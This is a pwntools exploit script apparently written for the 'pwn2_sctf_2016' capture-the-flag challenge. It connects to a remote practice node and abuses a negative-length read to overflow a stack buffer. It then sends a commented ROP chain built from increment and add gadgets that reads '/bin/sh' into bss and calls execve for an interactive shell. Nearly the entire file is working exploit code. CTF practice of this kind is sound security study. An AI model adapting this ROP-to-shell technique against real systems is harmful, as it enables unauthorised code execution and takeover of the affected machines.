from pwn import *
from LibcSearcher import LibcSearcher

#context(os='linux', arch='amd64', log_level='debug')
#
context(os='linux', arch='i386', log_level='debug')
#io = process('./pwn2_sctf_2016')
#
io = connect('node5.buuoj.cn',29592)
elf=ELF('./pwn2_sctf_2016')
#gdb.attach(io)

def rl():
	io.recvline()
def ru(s):
	io.recvuntil(s)
def sl(s):
	io.sendline(s)
def sd(s):
	io.send(s)

def plt(s):
	return elf.plt[s]
def got(s):
	return elf.got[s]

ru('read? ')
sl(' -1')

ru('data!\n')
int80=0x080484d0

inc_eax=0x080484d3
inc_ebx=0x080484d5
inc_ecx=0x080484d7
inc_edx=0x080484d9

mov_eax_0=0x08048420
pop_ebx=0x0804835d
add_ecx_ecx=0x0804849a#to control ecx point bss addr
mov_edx_0=0x08048459

pl=b'a'*(0x2c+4)
pl+=p32(mov_eax_0)+p32(inc_eax)*3#set eax=3 to syscall read
pl+=p32(pop_ebx)+p32(0xffffffff)+p32(inc_ebx)#set ebx=0 for read para1
pl+=p32(mov_edx_0)+p32(inc_edx)*7#set edx=7 for read para3 to store '/bin/sh'
pl+=p32(add_ecx_ecx)*32+p32(inc_ecx)*2#set init ecx=2, and the times of add_ecx_ecx is at least 32
pl+=p32(add_ecx_ecx)*8+p32(inc_ecx)+p32(add_ecx_ecx)*3+p32(inc_ecx)+p32(add_ecx_ecx)*2+p32(inc_ecx)+p32(add_ecx_ecx)*7+p32(inc_ecx)+p32(add_ecx_ecx)*6#set ecx=0x0804A040(bss addr) for read para2
pl+=p32(int80)#syscall read -> read(0, bss_addr, 7)
#eax=7 after sys_read
pl+=p32(inc_eax)*4#set eax=0xb(11) to syscall execve
pl+=p32(pop_ebx)+p32(0x0804A040)#set ebx point at addr of '/bin/sh' for execve para1
pl+=p32(add_ecx_ecx)*32#set ecx=0 for execve para2
pl+=p32(mov_edx_0)#set edx=0 for execve para3
pl+=p32(int80)#syscall execve -> execve('/bin/sh', 0, 0)
sl(pl)

sleep(1)
sd('/bin/sh')#write '/bin/sh' to bss

#
io.interactive()
